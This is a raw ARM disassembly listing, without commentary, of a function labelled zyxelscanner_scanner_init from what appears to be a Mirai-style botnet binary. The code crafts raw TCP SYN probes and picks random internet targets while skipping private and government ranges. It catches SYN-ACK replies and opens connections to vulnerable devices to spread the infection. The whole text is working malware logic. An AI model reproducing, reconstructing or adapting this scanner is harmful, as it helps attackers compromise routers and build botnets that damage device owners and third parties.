   15394:	e3a01b0a 	mov	r1, #10240	; 0x2800
   15398:	e5ce2000 	strb	r2, [lr]
   1539c:	e1ce10b2 	strh	r1, [lr, #2]
   153a0:	ebfff494 	bl	125f8 <rand_next>
   153a4:	e59f28f8 	ldr	r2, [pc, #2296]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   153a8:	e282b014 	add	fp, r2, #20
   153ac:	e5db100c 	ldrb	r1, [fp, #12]
   153b0:	e3a03040 	mov	r3, #64	; 0x40
   153b4:	e5c23008 	strb	r3, [r2, #8]
   153b8:	e3c110a0 	bic	r1, r1, #160	; 0xa0
   153bc:	e59f38e0 	ldr	r3, [pc, #2272]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   153c0:	e1c200b4 	strh	r0, [r2, #4]
   153c4:	e3811050 	orr	r1, r1, #80	; 0x50
   153c8:	e3a02006 	mov	r2, #6
   153cc:	e5c32009 	strb	r2, [r3, #9]
   153d0:	e5cb100c 	strb	r1, [fp, #12]
   153d4:	e59de014 	ldr	lr, [sp, #20]
   153d8:	e3a0ca05 	mov	ip, #20480	; 0x5000
   153dc:	e1c3e1b4 	strh	lr, [r3, #20]
   153e0:	e1cbc0b2 	strh	ip, [fp, #2]
   153e4:	ebfff483 	bl	125f8 <rand_next>
   153e8:	e5db300d 	ldrb	r3, [fp, #13]
   153ec:	e28d1028 	add	r1, sp, #40	; 0x28
   153f0:	e3833002 	orr	r3, r3, #2
   153f4:	e241100e 	sub	r1, r1, #14
   153f8:	e5cb300d 	strb	r3, [fp, #13]
   153fc:	e1cb00be 	strh	r0, [fp, #14]
   15400:	e58d100c 	str	r1, [sp, #12]
   15404:	e59f288c 	ldr	r2, [pc, #2188]	; 15c98 <zyxelscanner_scanner_init+0xa88>
   15408:	e5928000 	ldr	r8, [r2]
   1540c:	e1590008 	cmp	r9, r8
   15410:	0a0000a0 	beq	15698 <zyxelscanner_scanner_init+0x488>
   15414:	e3a03000 	mov	r3, #0
   15418:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   1541c:	e3a03000 	mov	r3, #0
   15420:	e58d3710 	str	r3, [sp, #1808]	; 0x710
   15424:	e58d3704 	str	r3, [sp, #1796]	; 0x704
   15428:	e58d3708 	str	r3, [sp, #1800]	; 0x708
   1542c:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
   15430:	ebfff470 	bl	125f8 <rand_next>
   15434:	e59fc858 	ldr	ip, [pc, #2136]	; 15c94 <zyxelscanner_scanner_init+0xa84>
   15438:	e59fe864 	ldr	lr, [pc, #2148]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   1543c:	e59c3000 	ldr	r3, [ip]
   15440:	e1ce00b4 	strh	r0, [lr, #4]
   15444:	e58e300c 	str	r3, [lr, #12]
   15448:	ebfff46a 	bl	125f8 <rand_next>
   1544c:	e20040ff 	and	r4, r0, #255	; 0xff
   15450:	e1a03420 	lsr	r3, r0, #8
   15454:	e1a02820 	lsr	r2, r0, #16
   15458:	e3540000 	cmp	r4, #0
   1545c:	1354007f 	cmpne	r4, #127	; 0x7f
   15460:	e20350ff 	and	r5, r3, #255	; 0xff
   15464:	e20270ff 	and	r7, r2, #255	; 0xff
   15468:	e1a06c20 	lsr	r6, r0, #24
   1546c:	0afffff5 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15470:	e3540003 	cmp	r4, #3
   15474:	0afffff3 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15478:	e244300f 	sub	r3, r4, #15
   1547c:	e3540038 	cmp	r4, #56	; 0x38
   15480:	13530001 	cmpne	r3, #1
   15484:	9affffef 	bls	15448 <zyxelscanner_scanner_init+0x238>
   15488:	e354000a 	cmp	r4, #10
   1548c:	0affffed 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15490:	e35400c0 	cmp	r4, #192	; 0xc0
   15494:	035500a8 	cmpeq	r5, #168	; 0xa8
   15498:	0affffea 	beq	15448 <zyxelscanner_scanner_init+0x238>
   1549c:	e35400ac 	cmp	r4, #172	; 0xac
   154a0:	13a03000 	movne	r3, #0
   154a4:	03a03001 	moveq	r3, #1
   154a8:	e355000f 	cmp	r5, #15
   154ac:	93a03000 	movls	r3, #0
   154b0:	e3530000 	cmp	r3, #0
   154b4:	0a000001 	beq	154c0 <zyxelscanner_scanner_init+0x2b0>
   154b8:	e355001f 	cmp	r5, #31
   154bc:	9affffe1 	bls	15448 <zyxelscanner_scanner_init+0x238>
   154c0:	e3540064 	cmp	r4, #100	; 0x64
   154c4:	13a03000 	movne	r3, #0
   154c8:	03a03001 	moveq	r3, #1
   154cc:	e355003f 	cmp	r5, #63	; 0x3f
   154d0:	93a03000 	movls	r3, #0
   154d4:	e3530000 	cmp	r3, #0
   154d8:	0a000001 	beq	154e4 <zyxelscanner_scanner_init+0x2d4>
   154dc:	e355007e 	cmp	r5, #126	; 0x7e
   154e0:	9affffd8 	bls	15448 <zyxelscanner_scanner_init+0x238>
   154e4:	e35400a9 	cmp	r4, #169	; 0xa9
   154e8:	035500ff 	cmpeq	r5, #255	; 0xff
   154ec:	0affffd5 	beq	15448 <zyxelscanner_scanner_init+0x238>
   154f0:	e35400c6 	cmp	r4, #198	; 0xc6
   154f4:	13a03000 	movne	r3, #0
   154f8:	03a03001 	moveq	r3, #1
   154fc:	e3550011 	cmp	r5, #17
   15500:	93a03000 	movls	r3, #0
   15504:	e3530000 	cmp	r3, #0
   15508:	0a000001 	beq	15514 <zyxelscanner_scanner_init+0x304>
   1550c:	e3550013 	cmp	r5, #19
   15510:	9affffcc 	bls	15448 <zyxelscanner_scanner_init+0x238>
   15514:	e35400df 	cmp	r4, #223	; 0xdf
   15518:	8affffca 	bhi	15448 <zyxelscanner_scanner_init+0x238>
   1551c:	e2443006 	sub	r3, r4, #6
   15520:	e354000b 	cmp	r4, #11
   15524:	13530001 	cmpne	r3, #1
   15528:	9affffc6 	bls	15448 <zyxelscanner_scanner_init+0x238>
   1552c:	e3540016 	cmp	r4, #22
   15530:	13540015 	cmpne	r4, #21
   15534:	0affffc3 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15538:	e354001c 	cmp	r4, #28
   1553c:	1354001a 	cmpne	r4, #26
   15540:	0affffc0 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15544:	e354001e 	cmp	r4, #30
   15548:	1354001d 	cmpne	r4, #29
   1554c:	0affffbd 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15550:	e3540037 	cmp	r4, #55	; 0x37
   15554:	13540021 	cmpne	r4, #33	; 0x21
   15558:	0affffba 	beq	15448 <zyxelscanner_scanner_init+0x238>
   1555c:	e35400d7 	cmp	r4, #215	; 0xd7
   15560:	135400d6 	cmpne	r4, #214	; 0xd6
   15564:	0affffb7 	beq	15448 <zyxelscanner_scanner_init+0x238>
   15568:	eb000c5d 	bl	186e4 <rand>
   1556c:	e59f3734 	ldr	r3, [pc, #1844]	; 15ca8 <zyxelscanner_scanner_init+0xa98>
   15570:	e0c12093 	smull	r2, r1, r3, r0
   15574:	e1a02fc0 	asr	r2, r0, #31
   15578:	e06220c1 	rsb	r2, r2, r1, asr #1
   1557c:	e1a03102 	lsl	r3, r2, #2
   15580:	e0833002 	add	r3, r3, r2
   15584:	e0502003 	subs	r2, r0, r3
   15588:	0386345e 	orreq	r3, r6, #1577058304	; 0x5e000000
   1558c:	01833805 	orreq	r3, r3, r5, lsl #16
   15590:	0a0000ef 	beq	15954 <zyxelscanner_scanner_init+0x744>
   15594:	e3520001 	cmp	r2, #1
   15598:	0386343e 	orreq	r3, r6, #1040187392	; 0x3e000000
   1559c:	01833805 	orreq	r3, r3, r5, lsl #16
   155a0:	0a0000eb 	beq	15954 <zyxelscanner_scanner_init+0x744>
   155a4:	e3520002 	cmp	r2, #2
   155a8:	0386341f 	orreq	r3, r6, #520093696	; 0x1f000000
   155ac:	01833805 	orreq	r3, r3, r5, lsl #16
   155b0:	0a0000e7 	beq	15954 <zyxelscanner_scanner_init+0x744>
   155b4:	e3520003 	cmp	r2, #3
   155b8:	0386345f 	orreq	r3, r6, #1593835520	; 0x5f000000
   155bc:	01833805 	orreq	r3, r3, r5, lsl #16
   155c0:	0a0000e3 	beq	15954 <zyxelscanner_scanner_init+0x744>
   155c4:	e3520004 	cmp	r2, #4
   155c8:	03863455 	orreq	r3, r6, #1426063360	; 0x55000000
   155cc:	01833805 	orreq	r3, r3, r5, lsl #16
   155d0:	0a0000df 	beq	15954 <zyxelscanner_scanner_init+0x744>
   155d4:	e3520005 	cmp	r2, #5
   155d8:	0a0000da 	beq	15948 <zyxelscanner_scanner_init+0x738>
   155dc:	e59f06c0 	ldr	r0, [pc, #1728]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   155e0:	e59d3010 	ldr	r3, [sp, #16]
   155e4:	e3a0c000 	mov	ip, #0
   155e8:	e3a01014 	mov	r1, #20
   155ec:	e5803010 	str	r3, [r0, #16]
   155f0:	e1c0c0ba 	strh	ip, [r0, #10]
   155f4:	ebffe49d 	bl	e870 <checksum_generic>
   155f8:	e59fe6a4 	ldr	lr, [pc, #1700]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   155fc:	e3e0cc6f 	mvn	ip, #28416	; 0x6f00
   15600:	e1ce00ba 	strh	r0, [lr, #10]
   15604:	e24cc0e0 	sub	ip, ip, #224	; 0xe0
   15608:	e1a0000e 	mov	r0, lr
   1560c:	e59ee010 	ldr	lr, [lr, #16]
   15610:	e1cbc0b2 	strh	ip, [fp, #2]
   15614:	e3a0c000 	mov	ip, #0
   15618:	e2801014 	add	r1, r0, #20
   1561c:	e3a02b05 	mov	r2, #5120	; 0x1400
   15620:	e3a03014 	mov	r3, #20
   15624:	e58be004 	str	lr, [fp, #4]
   15628:	e1cbc1b0 	strh	ip, [fp, #16]
   1562c:	ebffe4a3 	bl	e8c0 <checksum_tcpudp>
   15630:	e59fe668 	ldr	lr, [pc, #1640]	; 15ca0 <zyxelscanner_scanner_init+0xa90>
   15634:	e59f1668 	ldr	r1, [pc, #1640]	; 15ca4 <zyxelscanner_scanner_init+0xa94>
   15638:	e59e3000 	ldr	r3, [lr]
   1563c:	e591e010 	ldr	lr, [r1, #16]
   15640:	e3a0c010 	mov	ip, #16
   15644:	e1cb01b0 	strh	r0, [fp, #16]
   15648:	e58de708 	str	lr, [sp, #1800]	; 0x708
   1564c:	e58dc004 	str	ip, [sp, #4]
   15650:	e3a0e002 	mov	lr, #2
   15654:	e28dcc07 	add	ip, sp, #1792	; 0x700
   15658:	e1cce0b4 	strh	lr, [ip, #4]
   1565c:	e1dbe0b2 	ldrh	lr, [fp, #2]
   15660:	e1cce0b6 	strh	lr, [ip, #6]
   15664:	e28dcc07 	add	ip, sp, #1792	; 0x700
   15668:	e1a00003 	mov	r0, r3
   1566c:	e28cc004 	add	ip, ip, #4
   15670:	e3a03901 	mov	r3, #16384	; 0x4000
   15674:	e3a02028 	mov	r2, #40	; 0x28
   15678:	e58dc000 	str	ip, [sp]
   1567c:	eb000640 	bl	16f84 <__libc_sendto>
   15680:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   15684:	e2833001 	add	r3, r3, #1
   15688:	e3530b01 	cmp	r3, #1024	; 0x400
   1568c:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   15690:	baffff61 	blt	1541c <zyxelscanner_scanner_init+0x20c>
   15694:	e1a09008 	mov	r9, r8
   15698:	eb00046e 	bl	16858 <__GI___errno_location>
   1569c:	e59de00c 	ldr	lr, [sp, #12]
   156a0:	e1a0a000 	mov	sl, r0
   156a4:	e28e4014 	add	r4, lr, #20
   156a8:	e3a05000 	mov	r5, #0
   156ac:	e3a0c000 	mov	ip, #0
   156b0:	e58ac000 	str	ip, [sl]
   156b4:	e59f15e4 	ldr	r1, [pc, #1508]	; 15ca0 <zyxelscanner_scanner_init+0xa90>
   156b8:	e3a02e5e 	mov	r2, #1504	; 0x5e0
   156bc:	e5910000 	ldr	r0, [r1]
   156c0:	e282200a 	add	r2, r2, #10
   156c4:	e59d100c 	ldr	r1, [sp, #12]
   156c8:	e3a03901 	mov	r3, #16384	; 0x4000
   156cc:	e58dc004 	str	ip, [sp, #4]
   156d0:	e58dc000 	str	ip, [sp]
   156d4:	eb0005c8 	bl	16dfc <__libc_recvfrom>
   156d8:	e3500000 	cmp	r0, #0
   156dc:	da000055 	ble	15838 <zyxelscanner_scanner_init+0x628>
   156e0:	e59a3000 	ldr	r3, [sl]
   156e4:	e353000b 	cmp	r3, #11
   156e8:	0a000052 	beq	15838 <zyxelscanner_scanner_init+0x628>
   156ec:	e3500027 	cmp	r0, #39	; 0x27
   156f0:	9affffed 	bls	156ac <zyxelscanner_scanner_init+0x49c>
   156f4:	e59d300c 	ldr	r3, [sp, #12]
   156f8:	e59fc594 	ldr	ip, [pc, #1428]	; 15c94 <zyxelscanner_scanner_init+0xa84>
   156fc:	e5932010 	ldr	r2, [r3, #16]
   15700:	e59c3000 	ldr	r3, [ip]
   15704:	e1520003 	cmp	r2, r3
   15708:	1affffe7 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   1570c:	e59de00c 	ldr	lr, [sp, #12]
   15710:	e5de3009 	ldrb	r3, [lr, #9]
   15714:	e3530006 	cmp	r3, #6
   15718:	1affffe3 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   1571c:	e1d4e0b0 	ldrh	lr, [r4]
   15720:	e3a03a09 	mov	r3, #36864	; 0x9000
   15724:	e283301f 	add	r3, r3, #31
   15728:	e15e0003 	cmp	lr, r3
   1572c:	1affffde 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   15730:	e1d430b2 	ldrh	r3, [r4, #2]
   15734:	e59d1014 	ldr	r1, [sp, #20]
   15738:	e1530001 	cmp	r3, r1
   1573c:	1affffda 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   15740:	e5d4300d 	ldrb	r3, [r4, #13]
   15744:	e3130002 	tst	r3, #2
   15748:	0affffd7 	beq	156ac <zyxelscanner_scanner_init+0x49c>
   1574c:	e3130010 	tst	r3, #16
   15750:	0affffd5 	beq	156ac <zyxelscanner_scanner_init+0x49c>
   15754:	e3130004 	tst	r3, #4
   15758:	1affffd3 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   1575c:	e3130001 	tst	r3, #1
   15760:	1affffd1 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   15764:	e5941008 	ldr	r1, [r4, #8]
   15768:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
   1576c:	e1a02c21 	lsr	r2, r1, #24
   15770:	e2013cff 	and	r3, r1, #65280	; 0xff00
   15774:	e1822420 	orr	r2, r2, r0, lsr #8
   15778:	e1822403 	orr	r2, r2, r3, lsl #8
   1577c:	e1822c01 	orr	r2, r2, r1, lsl #24
   15780:	e2422001 	sub	r2, r2, #1
   15784:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
   15788:	e1a03c22 	lsr	r3, r2, #24
   1578c:	e2021cff 	and	r1, r2, #65280	; 0xff00
   15790:	e1833420 	orr	r3, r3, r0, lsr #8
   15794:	e1833401 	orr	r3, r3, r1, lsl #8
   15798:	e59d100c 	ldr	r1, [sp, #12]
   1579c:	e591c00c 	ldr	ip, [r1, #12]
   157a0:	e1833c02 	orr	r3, r3, r2, lsl #24
   157a4:	e153000c 	cmp	r3, ip
   157a8:	1affffbf 	bne	156ac <zyxelscanner_scanner_init+0x49c>
   157ac:	e35500ff 	cmp	r5, #255	; 0xff
   157b0:	ca000020 	bgt	15838 <zyxelscanner_scanner_init+0x628>
   157b4:	e59f24e0 	ldr	r2, [pc, #1248]	; 15c9c <zyxelscanner_scanner_init+0xa8c>
   157b8:	e1a03605 	lsl	r3, r5, #12
   157bc:	e5921000 	ldr	r1, [r2]
   157c0:	e0433505 	sub	r3, r3, r5, lsl #10
   157c4:	e0830001 	add	r0, r3, r1
   157c8:	e5902008 	ldr	r2, [r0, #8]
   157cc:	e3520000 	cmp	r2, #0
   157d0:	12852001 	addne	r2, r5, #1
   157d4:	11a03602 	lslne	r3, r2, #12
   157d8:	10433502 	subne	r3, r3, r2, lsl #10
   157dc:	10813003 	addne	r3, r1, r3
   157e0:	11a02005 	movne	r2, r5
   157e4:	0a000008 	beq	1580c <zyxelscanner_scanner_init+0x5fc>
   157e8:	e2822001 	add	r2, r2, #1
   157ec:	e3520c01 	cmp	r2, #256	; 0x100
   157f0:	0a000010 	beq	15838 <zyxelscanner_scanner_init+0x628>
   157f4:	e1a00003 	mov	r0, r3
   157f8:	e5933008 	ldr	r3, [r3, #8]
   157fc:	e3530000 	cmp	r3, #0
   15800:	e2803b03 	add	r3, r0, #3072	; 0xc00
   15804:	1afffff7 	bne	157e8 <zyxelscanner_scanner_init+0x5d8>
   15808:	e1a05002 	mov	r5, r2
   1580c:	e3500000 	cmp	r0, #0
   15810:	0a000008 	beq	15838 <zyxelscanner_scanner_init+0x628>
   15814:	e580c00c 	str	ip, [r0, #12]
   15818:	e1c0e1b0 	strh	lr, [r0, #16]
   1581c:	ebfffe46 	bl	1513c <zyxelscanner_setup_connection>
   15820:	eaffffa1 	b	156ac <zyxelscanner_scanner_init+0x49c>
   15824:	e59f3474 	ldr	r3, [pc, #1140]	; 15ca0 <zyxelscanner_scanner_init+0xa90>
   15828:	e5930000 	ldr	r0, [r3]
   1582c:	eb001183 	bl	19e40 <__GI___libc_close>
   15830:	e1a00005 	mov	r0, r5
   15834:	eb000db8 	bl	18f1c <__GI_exit>
   15838:	e3a03000 	mov	r3, #0
   1583c:	e58d3684 	str	r3, [sp, #1668]	; 0x684
   15840:	e3a02004 	mov	r2, #4
   15844:	e282cd1a 	add	ip, r2, #1664	; 0x680
   15848:	e2822004 	add	r2, r2, #4
   1584c:	e3a03000 	mov	r3, #0
   15850:	e28cc004 	add	ip, ip, #4
   15854:	e3520080 	cmp	r2, #128	; 0x80
   15858:	e78c300d 	str	r3, [ip, sp]
   1585c:	1afffff8 	bne	15844 <zyxelscanner_scanner_init+0x634>
   15860:	e58d3604 	str	r3, [sp, #1540]	; 0x604
   15864:	e2833004 	add	r3, r3, #4
   15868:	e283ec06 	add	lr, r3, #1536	; 0x600
   1586c:	e2833004 	add	r3, r3, #4
   15870:	e3a02000 	mov	r2, #0
   15874:	e28ee004 	add	lr, lr, #4
   15878:	e3530080 	cmp	r3, #128	; 0x80
   1587c:	e78e200d 	str	r2, [lr, sp]
   15880:	1afffff8 	bne	15868 <zyxelscanner_scanner_init+0x658>
   15884:	e1a07002 	mov	r7, r2
   15888:	e1a08002 	mov	r8, r2
   1588c:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   15890:	ea000014 	b	158e8 <zyxelscanner_scanner_init+0x6d8>
   15894:	e2413001 	sub	r3, r1, #1
   15898:	e3530002 	cmp	r3, #2
   1589c:	8a000035 	bhi	15978 <zyxelscanner_scanner_init+0x768>
   158a0:	e795c006 	ldr	ip, [r5, r6]
   158a4:	e28d3e72 	add	r3, sp, #1824	; 0x720
   158a8:	e1a022ac 	lsr	r2, ip, #5
   158ac:	e2833008 	add	r3, r3, #8
   158b0:	e1a02102 	lsl	r2, r2, #2
   158b4:	e0822003 	add	r2, r2, r3
   158b8:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
   158bc:	e20c001f 	and	r0, ip, #31
   158c0:	e3a03001 	mov	r3, #1
   158c4:	e1811013 	orr	r1, r1, r3, lsl r0
   158c8:	e15c0008 	cmp	ip, r8
   158cc:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
   158d0:	c1a0800c 	movgt	r8, ip
   158d4:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   158d8:	e2832001 	add	r2, r3, #1
   158dc:	e35200ff 	cmp	r2, #255	; 0xff
   158e0:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   158e4:	ca000031 	bgt	159b0 <zyxelscanner_scanner_init+0x7a0>
   158e8:	e59f13ac 	ldr	r1, [pc, #940]	; 15c9c <zyxelscanner_scanner_init+0xa8c>
   158ec:	e1a03602 	lsl	r3, r2, #12
   158f0:	e5916000 	ldr	r6, [r1]
   158f4:	e0435502 	sub	r5, r3, r2, lsl #10
   158f8:	e0854006 	add	r4, r5, r6
   158fc:	e5941008 	ldr	r1, [r4, #8]
   15900:	e3510000 	cmp	r1, #0
   15904:	0afffff2 	beq	158d4 <zyxelscanner_scanner_init+0x6c4>
   15908:	e59f2388 	ldr	r2, [pc, #904]	; 15c98 <zyxelscanner_scanner_init+0xa88>
   1590c:	e5923000 	ldr	r3, [r2]
   15910:	e5942004 	ldr	r2, [r4, #4]
   15914:	e0623003 	rsb	r3, r2, r3
   15918:	e3530005 	cmp	r3, #5
   1591c:	9affffdc 	bls	15894 <zyxelscanner_scanner_init+0x684>
   15920:	e7950006 	ldr	r0, [r5, r6]
   15924:	eb001145 	bl	19e40 <__GI___libc_close>
   15928:	e3e03000 	mvn	r3, #0
   1592c:	e3a02000 	mov	r2, #0
   15930:	e7853006 	str	r3, [r5, r6]
   15934:	e5842008 	str	r2, [r4, #8]
   15938:	e2840018 	add	r0, r4, #24
   1593c:	e3a01b01 	mov	r1, #1024	; 0x400
   15940:	ebfffc9d 	bl	14bbc <util_zero>
   15944:	eaffffe2 	b	158d4 <zyxelscanner_scanner_init+0x6c4>
   15948:	e1a03805 	lsl	r3, r5, #16
   1594c:	e1833c04 	orr	r3, r3, r4, lsl #24
   15950:	e1833006 	orr	r3, r3, r6
   15954:	e1833407 	orr	r3, r3, r7, lsl #8
   15958:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
   1595c:	e1a02c23 	lsr	r2, r3, #24
   15960:	e2031cff 	and	r1, r3, #65280	; 0xff00
   15964:	e1822420 	orr	r2, r2, r0, lsr #8
   15968:	e1822401 	orr	r2, r2, r1, lsl #8
   1596c:	e1823c03 	orr	r3, r2, r3, lsl #24
   15970:	e58d3010 	str	r3, [sp, #16]
   15974:	eaffff18 	b	155dc <zyxelscanner_scanner_init+0x3cc>
   15978:	e795c006 	ldr	ip, [r5, r6]
   1597c:	e28dee72 	add	lr, sp, #1824	; 0x720
   15980:	e1a032ac 	lsr	r3, ip, #5
   15984:	e1a03103 	lsl	r3, r3, #2
   15988:	e28ee008 	add	lr, lr, #8
   1598c:	e083300e 	add	r3, r3, lr
   15990:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
   15994:	e20c001f 	and	r0, ip, #31
   15998:	e3a01001 	mov	r1, #1
   1599c:	e1822011 	orr	r2, r2, r1, lsl r0
   159a0:	e157000c 	cmp	r7, ip
   159a4:	b1a0700c 	movlt	r7, ip
   159a8:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
   159ac:	eaffffc8 	b	158d4 <zyxelscanner_scanner_init+0x6c4>
   159b0:	e3a0c001 	mov	ip, #1
   159b4:	e3a04000 	mov	r4, #0
   159b8:	e58dc714 	str	ip, [sp, #1812]	; 0x714
   159bc:	e1580007 	cmp	r8, r7
   159c0:	a1a00008 	movge	r0, r8
   159c4:	b1a00007 	movlt	r0, r7
   159c8:	e28d1d1a 	add	r1, sp, #1664	; 0x680
   159cc:	e28d2c06 	add	r2, sp, #1536	; 0x600
   159d0:	e28dce71 	add	ip, sp, #1808	; 0x710
   159d4:	e28cc004 	add	ip, ip, #4
   159d8:	e2811004 	add	r1, r1, #4
   159dc:	e2822004 	add	r2, r2, #4
   159e0:	e1a03004 	mov	r3, r4
   159e4:	e2800001 	add	r0, r0, #1
   159e8:	e58dc000 	str	ip, [sp]
   159ec:	e58d4718 	str	r4, [sp, #1816]	; 0x718
   159f0:	eb000229 	bl	1629c <__libc_select>
   159f4:	e1a00004 	mov	r0, r4
   159f8:	eb00027b 	bl	163ec <__GI_time>
   159fc:	e59fe294 	ldr	lr, [pc, #660]	; 15c98 <zyxelscanner_scanner_init+0xa88>
   15a00:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   15a04:	e58e0000 	str	r0, [lr]
   15a08:	ea00000b 	b	15a3c <zyxelscanner_scanner_init+0x82c>
   15a0c:	e28dee72 	add	lr, sp, #1824	; 0x720
   15a10:	e28ee008 	add	lr, lr, #8
   15a14:	e081200e 	add	r2, r1, lr
   15a18:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
   15a1c:	e1a03453 	asr	r3, r3, r4
   15a20:	e3130001 	tst	r3, #1
   15a24:	1a00003f 	bne	15b28 <zyxelscanner_scanner_init+0x918>
   15a28:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   15a2c:	e2834001 	add	r4, r3, #1
   15a30:	e35400ff 	cmp	r4, #255	; 0xff
   15a34:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   15a38:	cafffe71 	bgt	15404 <zyxelscanner_scanner_init+0x1f4>
   15a3c:	e59f1258 	ldr	r1, [pc, #600]	; 15c9c <zyxelscanner_scanner_init+0xa8c>
   15a40:	e1a03604 	lsl	r3, r4, #12
   15a44:	e5918000 	ldr	r8, [r1]
   15a48:	e0437504 	sub	r7, r3, r4, lsl #10
   15a4c:	e7970008 	ldr	r0, [r7, r8]
   15a50:	e3700001 	cmn	r0, #1
   15a54:	e0876008 	add	r6, r7, r8
   15a58:	0afffff2 	beq	15a28 <zyxelscanner_scanner_init+0x818>
   15a5c:	e1a022a0 	lsr	r2, r0, #5
   15a60:	e28d3e72 	add	r3, sp, #1824	; 0x720
   15a64:	e2833008 	add	r3, r3, #8
   15a68:	e1a01102 	lsl	r1, r2, #2
   15a6c:	e0812003 	add	r2, r1, r3
   15a70:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
   15a74:	e200401f 	and	r4, r0, #31
   15a78:	e1a03453 	asr	r3, r3, r4
   15a7c:	e3130001 	tst	r3, #1
   15a80:	0affffe1 	beq	15a0c <zyxelscanner_scanner_init+0x7fc>
   15a84:	e3a0c004 	mov	ip, #4
   15a88:	e1a0200c 	mov	r2, ip
   15a8c:	e58dc71c 	str	ip, [sp, #1820]	; 0x71c
   15a90:	e28dce71 	add	ip, sp, #1808	; 0x710
   15a94:	e28d3e72 	add	r3, sp, #1824	; 0x720
   15a98:	e28cc00c 	add	ip, ip, #12
   15a9c:	e3a04000 	mov	r4, #0
   15aa0:	e3a01001 	mov	r1, #1
   15aa4:	e58d4720 	str	r4, [sp, #1824]	; 0x720
   15aa8:	e58dc000 	str	ip, [sp]
   15aac:	eb000471 	bl	16c78 <getsockopt>
   15ab0:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
   15ab4:	e1900003 	orrs	r0, r0, r3
   15ab8:	1a00006e 	bne	15c78 <zyxelscanner_scanner_init+0xa68>
   15abc:	e5963008 	ldr	r3, [r6, #8]
   15ac0:	e3530002 	cmp	r3, #2
   15ac4:	0a000050 	beq	15c0c <zyxelscanner_scanner_init+0x9fc>
   15ac8:	e3530003 	cmp	r3, #3
   15acc:	0a000069 	beq	15c78 <zyxelscanner_scanner_init+0xa68>
   15ad0:	e7973008 	ldr	r3, [r7, r8]
   15ad4:	e1a022a3 	lsr	r2, r3, #5
   15ad8:	e203401f 	and	r4, r3, #31
   15adc:	e1a01102 	lsl	r1, r2, #2
   15ae0:	e3a03002 	mov	r3, #2
   15ae4:	e5863008 	str	r3, [r6, #8]
   15ae8:	eaffffc7 	b	15a0c <zyxelscanner_scanner_init+0x7fc>
   15aec:	03a03068 	moveq	r3, #104	; 0x68
   15af0:	058a3000 	streq	r3, [sl]
   15af4:	0a000004 	beq	15b0c <zyxelscanner_scanner_init+0x8fc>
   15af8:	e3700001 	cmn	r0, #1
   15afc:	1a000023 	bne	15b90 <zyxelscanner_scanner_init+0x980>
   15b00:	e59a3000 	ldr	r3, [sl]
   15b04:	e353000b 	cmp	r3, #11
   15b08:	0affffc6 	beq	15a28 <zyxelscanner_scanner_init+0x818>
   15b0c:	e5963008 	ldr	r3, [r6, #8]
   15b10:	e3530002 	cmp	r3, #2
   15b14:	1a000032 	bne	15be4 <zyxelscanner_scanner_init+0x9d4>
   15b18:	e5960000 	ldr	r0, [r6]
   15b1c:	eb0010c7 	bl	19e40 <__GI___libc_close>
   15b20:	e1a00006 	mov	r0, r6
   15b24:	ebfffd84 	bl	1513c <zyxelscanner_setup_connection>
   15b28:	e5963008 	ldr	r3, [r6, #8]
   15b2c:	e3530000 	cmp	r3, #0
   15b30:	0affffbc 	beq	15a28 <zyxelscanner_scanner_init+0x818>
   15b34:	e5963014 	ldr	r3, [r6, #20]
   15b38:	e3530b01 	cmp	r3, #1024	; 0x400
   15b3c:	12865018 	addne	r5, r6, #24
   15b40:	0a00001e 	beq	15bc0 <zyxelscanner_scanner_init+0x9b0>
   15b44:	e3a07000 	mov	r7, #0
   15b48:	e58a7000 	str	r7, [sl]
   15b4c:	e5962014 	ldr	r2, [r6, #20]
   15b50:	e0854002 	add	r4, r5, r2
   15b54:	e5960000 	ldr	r0, [r6]
   15b58:	e2622b01 	rsb	r2, r2, #1024	; 0x400
   15b5c:	e1a01004 	mov	r1, r4
   15b60:	e3a03901 	mov	r3, #16384	; 0x4000
   15b64:	eb000476 	bl	16d44 <__libc_recv>
   15b68:	e3500000 	cmp	r0, #0
   15b6c:	daffffde 	ble	15aec <zyxelscanner_scanner_init+0x8dc>
   15b70:	e1a02007 	mov	r2, r7
   15b74:	e7d23004 	ldrb	r3, [r2, r4]
   15b78:	e3530000 	cmp	r3, #0
   15b7c:	02833041 	addeq	r3, r3, #65	; 0x41
   15b80:	07c23004 	strbeq	r3, [r2, r4]
   15b84:	e2822001 	add	r2, r2, #1
   15b88:	e1520000 	cmp	r2, r0
   15b8c:	1afffff8 	bne	15b74 <zyxelscanner_scanner_init+0x964>
   15b90:	e59f1100 	ldr	r1, [pc, #256]	; 15c98 <zyxelscanner_scanner_init+0xa88>
